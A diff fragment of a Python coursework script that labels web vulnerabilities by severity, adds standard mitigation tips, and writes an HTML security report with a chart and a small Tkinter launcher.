+def severity(v):
+    return {
+        "SQL Injection":"Critical",
+        "IDOR":"Critical",
+        "XSS":"High",
+        "Authentication Issue":"Medium"
+    }.get(v, "Low")
+
+data["severity"] = data["vulnerability"].apply(severity)
+
+risk_score = {"Low":2,"Medium":5,"High":8,"Critical":10}
+data["risk_score"] = data["severity"].map(risk_score)
+
+# -------------------------------------------------
+# 6️⃣ Mitigation Suggestions
+# -------------------------------------------------
+def fix(v):
+    return {
+        "SQL Injection":"Use prepared statements, sanitization, WAF.",
+        "XSS":"Escape output, CSP headers, sanitize HTML.",
+        "Authentication Issue":"Enable MFA, session timeout, secure cookies.",
+        "IDOR":"Implement authorization checks on object access."
+    }.get(v,"Follow OWASP Top 10 guidelines.")
+
+data["mitigation"] = data["vulnerability"].apply(fix)
+
+# -------------------------------------------------
+# 7️⃣ Executive Summary
+# -------------------------------------------------
+critical = len(data[data["severity"]=="Critical"])
+high = len(data[data["severity"]=="High"])
+
+executive_summary = f"""
+<h2>EXECUTIVE SUMMARY</h2>
+<p>This system contains <b>{critical} Critical</b> and <b>{high} High</b> severity issues.
+Immediate patching required to prevent exploitation.</p>
+"""
+
+# -------------------------------------------------
+# 8️⃣ Generate Severity Chart
+# -------------------------------------------------
+plt.figure(figsize=(6,4))
+data["severity"].value_counts().plot(kind="bar")
+plt.title("Severity Levels")
+plt.xlabel("Level")
+plt.ylabel("Count")
+plt.tight_layout()
+plt.savefig("severity_chart.png")
+print("📊 Chart created: severity_chart.png")
+
+# -------------------------------------------------
+# 9️⃣ Create HTML Report
+# -------------------------------------------------
+html = f"""
+<html>
+<head>
+<title>Week 7 Security Report</title>
+<style>
+body {{ font-family:Arial; margin:20px; }}
+table {{ width:100%; border-collapse:collapse; }}
+td, th {{ border:1px solid #444; padding:8px; }}
+th {{ background:#222; color:white; }}
+</style>
+</head>
+<body>
+
+<h1>Week 7 - AI Security Report</h1>
+{executive_summary}
+<h3>Findings</h3>
+{data.to_html(index=False)}
+
+<br>
+<h3>Severity Chart</h3>
+<img src='severity_chart.png' width='500'>
+
+</body></html>
+"""
+
+with open("week7_security_report.html","w",encoding="utf-8") as f:
+    f.write(html)
+
+print("📄 Report saved: week7_security_report.html")
+
+# -------------------------------------------------
+# 🔟 GUI Launcher (Optional)
+# -------------------------------------------------
+def open_report():
+    os.system("start week7_security_report.html")
+    messagebox.showinfo("Open", "Report Opened")
+
+root = tk.Tk()
+root.title("Week 7 Report System")
+root.geometry("280x120")
+tk.Button(root,text="Open Report",command=open_report).pack(pady=20)
+root.mainloop()
+</pre>
+
+<!-- OUTPUT LINK BUTTON -->
+<a href="week7_security_report.html" target="_blank" class="run-btn">📄 Open Week 7 Report</a>
+
+</div>
